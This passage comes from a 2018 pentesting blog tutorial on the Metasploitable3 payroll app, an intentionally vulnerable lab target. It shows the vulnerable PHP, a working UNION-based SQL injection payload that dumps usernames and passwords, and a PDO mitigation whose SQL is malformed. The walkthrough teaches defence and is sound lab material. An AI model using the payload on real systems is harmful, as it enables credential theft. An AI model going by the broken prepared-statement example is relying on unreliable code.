variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">/* store first result set */</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;center>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2>Welcome, \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$user</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/h2>&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;table style='border-radius: 25px; border: 2px solid black;' cellspacing=30>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;tr>&lt;th>Username&lt;/th>&lt;th>First Name&lt;/th>&lt;th>Last Name&lt;/th>&lt;th>Salary&lt;/th>&lt;/tr>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">store_result</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token variable\">$keys</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_keys</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;tr>\"</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$keys</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;td>\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/td>\"</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/tr>\\n\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">more_results</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/table>&lt;/center>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">next_result</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>Our worst fears have come to light! Yes, the web application is leveraging string concatenation to build an SQL query. Gah! For those new to SQL Injection, forming SQL statements using string concatenation is really bad practice! It basically allows an attacker to craft their own SQL statement. If you are interested in more information about this topic, leave a comment and I can write a thorough post about it in the future.</p>\n<p>The summary of the problem is this line:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select username, first_name, last_name, salary from users where username = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' and password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>'\"</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>To save you scrolling up, our SQL Injection that dumped the user passwords was:</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">' <span class=\"token operator\">OR</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">FROM</span> users<span class=\"token comment\">#</span></code></pre></div>\n<p>If we combine the two, our resultant SQL Injection attack is:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select username, first_name, last_name, salary from users where username = '' OR 1=1 UNION SELECT null,null,username,password FROM users#' and password = ''\"</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>This SQL Injection attack successfully leverages the weakness in string concatenation by altering the logic in the SQL query. As a quick summary: </p>\n<ul>\n<li>All users are displayed including the username, first name, last name and salary</li>\n<li>\n<p>This is because the first SQL query is always true:</p>\n<ul>\n<li><code class=\"language-text\">username = \"\"</code> is always false</li>\n<li><code class=\"language-text\">1=1</code> is always true</li>\n<li><code class=\"language-text\">username = \"\" OR 1=1</code> is therefore, always true</li>\n</ul>\n</li>\n<li>The <code class=\"language-text\">UNION</code> statement allows execution of an additional SQL statement where we leverage it to dump the username and password for each user</li>\n</ul>\n<p>OK, that is interesting… but how can we fix this specific problem?</p>\n<h4 id=\"mitigating-sql-injection-attacks-against-payroll_appphp\" style=\"position:relative;\"><a href=\"#mitigating-sql-injection-attacks-against-payroll_appphp\" aria-label=\"mitigating sql injection attacks against payroll_appphp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigating SQL Injection Attacks Against <code class=\"language-text\">payroll_app.php</code></h4>\n<p>This is the final topic we want to investigate in this post. Determining how we can fix the SQL Injection vulnerability. For web application security, the go-to resource is the Open Web Application Security Project or OWASP. They provide recommendations on how to correctly secure web applications. OWASP outline an <a href=\"https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet\">SQL Injection Prevention Cheat Sheet</a> which outlines good practice to mitigate SQL Injection vulnerabilities. </p>\n<p>We will not cover every aspect of mitigation, but will briefly discuss <strong>Defense Option 1: Prepared Statements (with Parameterized Queries)</strong>. <a href=\"https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28with_Parameterized_Queries.29\">OWASP recommend to use prepared statements</a> to mitigate SQL Injection vulnerabilities. The specific recommendation for PHP is:</p>\n<ul>\n<li>Use PDO with strongly typed parameterized queries (using bindParam())</li>\n</ul>\n<p><a href=\"http://php.net/manual/en/book.pdo.php\">PHP Data Objects</a>, or PDO, is the solution. Unfortunately, it is not a quick solution; for example, changing just the <code class=\"language-text\">sql</code> construction method. The bulk of the code to query the database and print the HTML table would require a re-write. Instead of a complete answer, a small comparison of the original SQL string and a PDO construct is sufficient.</p>\n<p>The code below is the original method used to create the SQL statement using the user input:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select username, first_name, last_name, salary from users where username = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' and password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>'\"</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>The code below is a quick summary of what it should be, using PDO.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT FROM users (username, first_name, last_name, salary) WHERE username = :user AND password = :pass)\"</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Like I briefly mentioned, making the change above would require additional modification of the source code, including the method used to connect to the MySQL database too. If you are interested in this, please leave a comment below, it might be a good topic for another blog post. A very good tutorial on PDO is the <a href=\"https://phpdelusions.net/pdo\">(The only proper) PDO tutorial</a>, it is definitely worth a read.</p>\n<h2 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>This tutorial was the first in a series about pentesting the Metasploitable3 Ubuntu Linux version. Hopefully, this tutorial gave you some ideas and knowledge about the SQL injection vulnerabilities in the <em>Payroll App</em> that is running on the Metasploitable3 server. However, the most important part of this post is the review of the source code of the <em>Payroll App</em> and understanding why SQL Injection vulnerabilities are present and how and why SQL injection attacks occur.</p>\n<p>In the next post, we will look at other open ports on Metasploitable3, the services that are running, and use the Metasploit Framework to exploit some vulnerabilities. Hope you enjoyed the post, and please leave a comment if you have any questions or information to share!</p>","frontmatter":{"title":"Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 1)","date":"July 08, 2018","tags":["Metasploitable3","Pentesting","SQL Injection"],"description":"Walkthrough of Pentesting the Metasploitable3 Ubuntu Linux version using SQL Injection.","thumbnail":"metasploitable3.png"}},"previous":{"fields":{"slug":"/blog/2018-07-07/how-to-reset-and-revert-git-commits/"},"frontmatter":{"title":"How to Reset and Revert Git Commits"}},"next":{"fields":{"slug":"/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2/"},"frontmatter":{"title":"Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 2)"}}},"pageContext":{"id":"ff31b458-54da-5325-8181-9da709962911","previousPostId":"98717890-4a81-58c8-a3d7-8185c6e1c3c2","nextPostId":"970a8eee-dcd0-514b-be8e-4e40e041b41f"}},"staticQueryHashes":["1771194231","2841359383","3880320062"]}